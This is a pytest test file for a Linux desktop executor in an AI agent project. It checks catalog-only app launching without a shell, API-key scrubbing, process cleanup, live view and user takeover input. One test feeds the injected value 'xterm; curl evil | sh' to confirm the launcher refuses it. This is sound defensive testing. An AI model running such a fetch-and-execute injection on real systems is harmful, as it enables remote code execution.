"""The Linux desktop executor (KAN-108): app launch, cleanup, live view and takeover input."""

from __future__ import annotations

import signal
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from operon.executor import desktop as _desktop
from operon.executor import linux_desktop
from operon.executor.linux_desktop import LinuxDesktopExecutor
from operon.models.policy import ActionType, AgentAction
from tests.fixtures.paths import unique_artifact_dir

_SCREEN = {"left": 0, "top": 0, "width": 1280, "height": 800}


def _fake_mss(width: int = 1280, height: int = 800):
    shot = SimpleNamespace(rgb=b"\x80" * (width * height * 3), size=(width, height), width=width, height=height)
    ctx = MagicMock()
    ctx.__enter__ = MagicMock(return_value=ctx)
    ctx.__exit__ = MagicMock(return_value=False)
    ctx.monitors = [dict(_SCREEN), dict(_SCREEN)]
    ctx.grab.return_value = shot
    return MagicMock(return_value=ctx)


@pytest.fixture
def gui(monkeypatch: pytest.MonkeyPatch) -> MagicMock:
    fake = MagicMock()
    fake.KEYBOARD_KEYS = ["ctrl", "alt", "d", "enter", "a", "win"]
    monkeypatch.setattr(_desktop, "pyautogui", fake)
    monkeypatch.setattr(_desktop, "_mss", _fake_mss())
    return fake


@pytest.fixture
def executor(monkeypatch: pytest.MonkeyPatch, gui) -> LinuxDesktopExecutor:
    monkeypatch.setenv("OPERON_TEST_SAFE_MODE", "true")
    ex = LinuxDesktopExecutor(artifact_dir=unique_artifact_dir("linux-desktop"))
    ex.set_current_run_id("run-1")

    async def _after() -> str:
        return "after.png"

    monkeypatch.setattr(ex, "_capture_after", _after)
    monkeypatch.setattr(ex, "_post_launch_delay", 0)
    return ex


async def test_reset_shows_the_xfce_desktop(executor, gui) -> None:
    await executor.reset_desktop()
    gui.hotkey.assert_called_once_with("ctrl", "alt", "d")


async def test_launch_runs_the_catalog_argv_without_a_shell(executor, monkeypatch) -> None:
    popen = MagicMock(return_value=SimpleNamespace(pid=4321))
    monkeypatch.setattr(linux_desktop.subprocess, "Popen", popen)
    monkeypatch.setenv("GEMINI_API_KEY", "secret")

    result = await executor.execute(AgentAction(action_type=ActionType.LAUNCH_APP, text="Spreadsheet"))

    assert result.success
    argv = popen.call_args.args[0]
    kwargs = popen.call_args.kwargs
    assert argv == ["libreoffice", "--calc"]
    assert kwargs["start_new_session"] is True and "shell" not in kwargs
    assert "GEMINI_API_KEY" not in kwargs["env"]
    assert executor._launched_processes["run-1"][0].pid == 4321


async def test_launch_refuses_apps_outside_the_catalog(executor, monkeypatch) -> None:
    popen = MagicMock()
    monkeypatch.setattr(linux_desktop.subprocess, "Popen", popen)

    result = await executor.execute(AgentAction(action_type=ActionType.LAUNCH_APP, text="xterm; curl evil | sh"))

    assert not result.success
    popen.assert_not_called()


def test_cleanup_ends_each_launched_process_group(executor, monkeypatch) -> None:
    killed: list[tuple[int, int]] = []

    def killpg(pid: int, sig: int) -> None:
        if pid == 2:
            raise ProcessLookupError
        killed.append((pid, sig))

    monkeypatch.setattr(linux_desktop.os, "killpg", killpg)
    procs = [SimpleNamespace(pid=1, wait=lambda timeout: 0), SimpleNamespace(pid=2, wait=lambda timeout: 0)]
    executor._launched_processes["run-1"] = procs

    assert executor.cleanup_run("run-1") == 1
    assert killed == [(1, signal.SIGTERM)]
    assert "run-1" not in executor._launched_processes


async def test_live_view_streams_only_the_run_on_this_desktop(executor) -> None:
    assert await executor.live_frame_png("someone-else") is None
    frame = await executor.live_frame_png("run-1")
    assert frame[:2] == b"\xff\xd8"  # a JPEG
    # Viewers share frames: a second poll right away reuses the same one.
    assert await executor.live_frame_png("run-1") is frame


async def test_live_view_scales_wide_screens_down(executor, monkeypatch) -> None:
    from io import BytesIO

    from PIL import Image

    monkeypatch.setattr(_desktop, "_mss", _fake_mss(2560, 1440))
    image = Image.open(BytesIO(await executor.live_frame_png("run-1")))
    assert image.size == (1280, 720)


async def test_takeover_input_maps_page_ratios_to_screen_pixels(executor, gui, monkeypatch) -> None:
    assert await executor.user_input("run-1", input_type="click", x_ratio=0.5, y_ratio=1.0)
    gui.click.assert_called_once_with(640, 799)

    assert await executor.user_input("run-1", input_type="scroll", x_ratio=0.0, y_ratio=0.0, delta_y=300)
    gui.scroll.assert_called_once_with(-3, x=0, y=0)

    assert await executor.user_input("run-1", input_type="key", key="ctrl+a")
    gui.hotkey.assert_called_with("ctrl", "a")

    copied: list[str] = []
    monkeypatch.setattr(_desktop.pyperclip, "copy", copied.append)
    assert await executor.user_input("run-1", input_type="type", text="Zoë 東京")
    assert copied == ["Zoë 東京"]
    gui.hotkey.assert_called_with("ctrl", "v")


async def test_takeover_input_rejects_other_runs_and_unknown_keys(executor, gui) -> None:
    assert not await executor.user_input("run-2", input_type="click")
    with pytest.raises(ValueError):
        await executor.user_input("run-1", input_type="key", key="hyper")
    gui.click.assert_not_called()


def test_the_platform_picks_the_linux_catalog_and_prompt(monkeypatch) -> None:
    from operon.agent.app_catalog import (
        APP_LAUNCH_TARGETS,
        LINUX_APP_LAUNCH_TARGETS,
        launch_targets,
    )
    from operon.agent.backends.desktop_computer_use import launch_app_function
    from operon.api.runtime.services import desktop_prompt_name

    monkeypatch.delenv("OPERON_DESKTOP_PLATFORM", raising=False)
    assert launch_targets() is APP_LAUNCH_TARGETS
    assert desktop_prompt_name() == "desktop_computer_use_prompt.txt"

    monkeypatch.setenv("OPERON_DESKTOP_PLATFORM", "Linux")
    assert launch_targets() is LINUX_APP_LAUNCH_TARGETS
    assert desktop_prompt_name() == "desktop_computer_use_prompt_linux.txt"
    assert launch_app_function()["parameters"]["properties"]["app"]["enum"] == sorted(LINUX_APP_LAUNCH_TARGETS)


def test_linux_prompt_exists_and_names_linux() -> None:
    from operon.core.paths import prompts_dir

    text = (prompts_dir() / "desktop_computer_use_prompt_linux.txt").read_text(encoding="utf-8")
    assert "Linux" in text and "Windows" not in text
    assert "{intent}" in text

